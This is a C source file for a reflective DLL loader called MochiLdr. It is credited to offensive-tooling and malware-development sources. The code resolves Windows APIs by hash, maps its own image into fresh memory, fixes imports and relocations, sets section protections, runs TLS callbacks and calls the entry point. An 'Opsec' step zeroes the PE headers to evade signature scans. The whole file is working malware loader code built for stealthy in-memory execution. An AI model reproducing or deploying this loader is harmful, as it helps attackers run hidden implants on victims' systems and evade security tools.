/*

	Author: Mochabyte
	Date: 22.11.2025
	Inspired by: 5pider, Bobby Cooke, Maldev Academy

*/

#include  "include/MochiLdr.h"

DLLEXPORT VOID MochiLdr() {

	HMODULE					MochiLoader				= NULL;
	FUNCS					Functions				= { 0 };
	PIMAGE_DOS_HEADER		pDOSHeader;
	PIMAGE_NT_HEADERS		pNtHeaders;
	ULONG_PTR				uiBaseAddress;
	SIZE_T					MochiMemorySize			= 0;
	LPVOID					MochiNewMemory			= NULL;
	PIMAGE_SECTION_HEADER   MochiSectionHeader		= NULL;
	PVOID					SecMemory				= NULL;
	SIZE_T					SecMemorySize			= 0;
	DWORD					Protection				= 0;
	ULONG					OldProtection			= 0;
	PIMAGE_DATA_DIRECTORY	MochiEntryImportDataDir;
	PIMAGE_NT_HEADERS		pNewNtHeaders			= NULL;

	// 1. Getting the image base addr of our DLL
	MochiLoader = MochiCaller();

	// 2. Loading all modules and WinAPIs
	Functions.Modules.Ntdll		= GetModHandle(Ntdll_HASH);
	Functions.Modules.Kernel32	= GetModHandle(Kernel32_HASH);

	Functions.Api.AllocMem		= GetPrcAddr(Functions.Modules.Ntdll, NtAllocMem_HASH, 0);
	Functions.Api.ProtectMem	= GetPrcAddr(Functions.Modules.Ntdll, NtProtectMem_HASH, 0);
	Functions.Api.LoadDll		= GetPrcAddr(Functions.Modules.Ntdll, LdrLoadDll_HASH, 0);
	Functions.Api.FlushInstruct = GetPrcAddr(Functions.Modules.Ntdll, NtFlushInstruct_HASH, 0);
	Functions.Api.AddFuncTbl	= GetPrcAddr(Functions.Modules.Kernel32, AddFuncTable_HASH, 0);

	// Getting to the NT headers of the PE to be loaded
	pDOSHeader = (PIMAGE_DOS_HEADER)MochiLoader;
	pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pDOSHeader + pDOSHeader->e_lfanew);
	MochiMemorySize = pNtHeaders->OptionalHeader.SizeOfImage;


	// 3. Allocating memory for the new PE
	if (NT_SUCCESS(Functions.Api.AllocMem(NtCurrentProcess(), &MochiNewMemory, 0, &MochiMemorySize, MEM_COMMIT, PAGE_READWRITE))) {

		// First, copying the PE headers
		ldr_memcpy(MochiNewMemory, MochiLoader, pNtHeaders->OptionalHeader.SizeOfHeaders);

		// Copying the sections into that new memory section
		MochiSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

		for (DWORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
		{
			PIMAGE_SECTION_HEADER sec = &MochiSectionHeader[i];

			if (!sec->SizeOfRawData)
				continue;

			BYTE* dst = (PBYTE)MochiNewMemory + sec->VirtualAddress;
			BYTE* src = (BYTE*)MochiLoader + sec->PointerToRawData;

			ldr_memcpy(dst, src, sec->SizeOfRawData);

		}

		// Get NT headers from the new memory location
		pNewNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)MochiNewMemory + ((PIMAGE_DOS_HEADER)MochiNewMemory)->e_lfanew);

		// 4. Now handling IAT repairing
		MochiEntryImportDataDir = &pNewNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
		
		if (MochiEntryImportDataDir->VirtualAddress && MochiEntryImportDataDir->Size) {
			PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)MochiNewMemory + MochiEntryImportDataDir->VirtualAddress);

			if (!RepairIAT(&Functions, (PBYTE)MochiNewMemory, pImportDesc)) {
				return NULL;
			}
		}

		// 5. Doing relocations
		if (!FixReloc(&pNewNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC], MochiNewMemory, pNewNtHeaders->OptionalHeader.ImageBase)) {
			return NULL;
		}

		// 6. Fixing memory perms
		for (DWORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
		{
			SecMemory = ((PBYTE)MochiNewMemory + MochiSectionHeader[i].VirtualAddress);
			SecMemorySize = MochiSectionHeader[i].SizeOfRawData;
			Protection = PAGE_NOACCESS;
			OldProtection = 0;

			DWORD Characteristics = MochiSectionHeader[i].Characteristics;
			BOOL isRead = (Characteristics & IMAGE_SCN_MEM_READ) != 0;
			BOOL isWrite = (Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
			BOOL isExecute = (Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;

			if (isExecute && isWrite && isRead)
				Protection = PAGE_EXECUTE_READWRITE;
			else if (isExecute && isRead)
				Protection = PAGE_EXECUTE_READ;
			else if (isExecute && isWrite)
				Protection = PAGE_EXECUTE_WRITECOPY;
			else if (isExecute)
				Protection = PAGE_EXECUTE;
			else if (isWrite && isRead)
				Protection = PAGE_READWRITE;
			else if (isRead)
				Protection = PAGE_READONLY;
			else if (isWrite)
				Protection = PAGE_WRITECOPY;

			Functions.Api.ProtectMem(NtCurrentProcess(), &SecMemory, &SecMemorySize, Protection, &OldProtection);

	}
	
		// Opsec: zero out PE headers to "evade" signature scans
		ldr_memset(MochiNewMemory, 0, sizeof(IMAGE_DOS_HEADER) + 0x40);
	
		// 7. Handling Exception handlers
		if (pNewNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size) {

			PIMAGE_RUNTIME_FUNCTION_ENTRY pRuntimeFunc = (PIMAGE_RUNTIME_FUNCTION_ENTRY)((PBYTE)MochiNewMemory + pNewNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress);
			Functions.Api.AddFuncTbl(pRuntimeFunc, (pNewNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size / sizeof(RUNTIME_FUNCTION)) -1 , (DWORD64)MochiNewMemory);
		}

		// 8. TLS Callbacks
		if (pNewNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size) {
			
			// Retrieve the address of the TLS Directory.
			PIMAGE_TLS_DIRECTORY pImgTlsDirectory = (PIMAGE_TLS_DIRECTORY)((PBYTE)MochiNewMemory + pNewNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
			// Get the address of the TLS Callbacks from the TLS Directory.
			PIMAGE_TLS_CALLBACK* pImgTlsCallback = (PIMAGE_TLS_CALLBACK*)(pImgTlsDirectory->AddressOfCallBacks);
			CONTEXT pCtx = { 0x00 };

			// Iterate through and invoke each TLS Callback until a NULL callback is encountered.
			for (; *pImgTlsCallback; pImgTlsCallback++)
				(*pImgTlsCallback)((LPVOID)MochiNewMemory, DLL_PROCESS_ATTACH, &pCtx);
		}

		// 9. Flush instruction cache
		Functions.Api.FlushInstruct((HANDLE)-1, NULL, 0x00);

		// 10. Executing the PE
		BOOL(WINAPI* MochiDllMain) (PVOID, DWORD, PVOID) = (PBYTE)MochiNewMemory + pNewNtHeaders->OptionalHeader.AddressOfEntryPoint;
		MochiDllMain((HMODULE)MochiNewMemory, DLL_PROCESS_ATTACH, NULL);

	}

}